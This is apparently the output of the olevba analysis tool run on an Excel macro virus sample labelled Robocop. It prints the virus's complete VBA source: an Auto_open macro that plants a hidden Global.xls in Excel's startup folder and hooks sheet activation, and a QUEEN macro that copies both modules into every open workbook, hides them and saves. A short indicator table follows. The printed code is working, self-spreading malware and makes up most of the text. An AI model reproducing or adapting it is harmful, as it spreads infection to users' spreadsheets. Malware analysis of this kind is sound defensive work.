olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Robocop-178bd0774bb48b6dacc7382f6023d261d30ead7e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO QUEEN.bas 
in file: Virus.MSExcel.Robocop-178bd0774bb48b6dacc7382f6023d261d30ead7e - OLE stream: '_VBA_PROJECT_CUR/VBA/QUEEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' QUEEN Macro
' Macro recorded 31.07.97 by Unknown User
' (c) 1997 Master of infection
' Queen Hitman Virus inc.
' http://www.deol.ru/users/queeni/
' come and look arround ;)
Sub QUEEN()
Attribute QUEEN.VB_Description = "Macro recorded 31.07.97 by Unknown User\n\n \n\n!\nЃ\n"
inside = 0
Application.ScreenUpdating = False
Set a = Application.ActiveWorkbook
For x = 1 To Application.Workbooks.Count
On Error GoTo err
If Application.Workbooks(x).Name = a.Name Then
For y = 1 To Application.Workbooks(a.Name).Modules.Count
If Application.Workbooks(a.Name).Modules(y).Name = "HIT" Then
inside = 1
End If
Next
If inside = 0 Then
Windows(a.Name).Visible = True
ActiveWorkbook.Modules.Add
Application.Workbooks("Global.xls").Modules("HIT").Copy _
after:=ActiveWorkbook.Modules(1)
ActiveWorkbook.Modules.Add
Application.Workbooks("Global.xls").Modules("QUEEN").Copy _
after:=ActiveWorkbook.Modules(2)
Application.DisplayAlerts = False
Sheets("Module1").Select
ActiveWindow.SelectedSheets.Delete
Sheets("Module2").Select
ActiveWindow.SelectedSheets.Delete
Application.DisplayAlerts = True
Sheets("HIT").Select
ActiveWindow.SelectedSheets.Visible = False
Sheets("QUEEN").Select
ActiveWindow.SelectedSheets.Visible = False
Windows(a.Name).Visible = True
Application.ActiveWorkbook.Save
End If
End If
Next
err:
Application.ScreenUpdating = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO HIT.bas 
in file: Virus.MSExcel.Robocop-178bd0774bb48b6dacc7382f6023d261d30ead7e - OLE stream: '_VBA_PROJECT_CUR/VBA/HIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' Auto_open Macro
' Macro recorded 31.07.97 by Unknown User
' (c) 1997 Master of infection
' Queen Hitman Virus inc.
' QueenI@deol.ru
' Hammer to fall   ;)
Sub Auto_open()
Attribute Auto_open.VB_Description = "Macro recorded 31.07.97 by Unknown User"
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n0"
exists = 0
inside = 0
Application.ScreenUpdating = False
For x = 1 To Application.Workbooks.Count
If Application.Workbooks(x).Name = "Global.xls" Then
exists = 1
End If
Next
If exists = 0 Then
Set a = Application.ActiveWorkbook
Application.Workbooks(a.Name).SaveCopyAs Application.StartupPath + "\Global.xls"
Application.Workbooks.Open (Application.StartupPath + "\Global.xls")
Application.Workbooks("Global.xls").Save
End If
For y = 1 To Application.Workbooks("Global.xls").Modules.Count
If Application.Workbooks("Global.xls").Modules(y).Name = "HIT" Then
inside = 1
End If
Next
If inside = 0 Then
Set b = Application.ActiveWorkbook
Application.Workbooks(b.Name).Modules("HIT").Copy after:=Application.Workbooks("Global.xls").Modules(1)
Application.Workbooks(b.Name).Modules("QUEEN").Copy after:=Application.Workbooks("Global.xls").Modules(1)
Application.OnSheetActivate = ActiveWorkbook.Name & "!QUEEN.QUEEN"
Application.Workbooks("Global.xls").Save
End If
Application.OnSheetActivate = Workbooks("Global.xls").Name & "!QUEEN.QUEEN"
Windows("Global.xls").Visible = False
Application.Workbooks("Global.xls").Save
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible - QUEEN
' 0085     10 BOUNDSHEET : Sheet Information - Visual Basic module, visible - HIT
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet2
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet3
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet4
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet5
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet6
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet7
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet8
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet9
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet10
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet11
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet12
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet13
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet14
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet15
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet16
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |http://www.deol.ru/u|URL                                          |
|          |sers/queeni/        |                                             |
+----------+--------------------+---------------------------------------------+

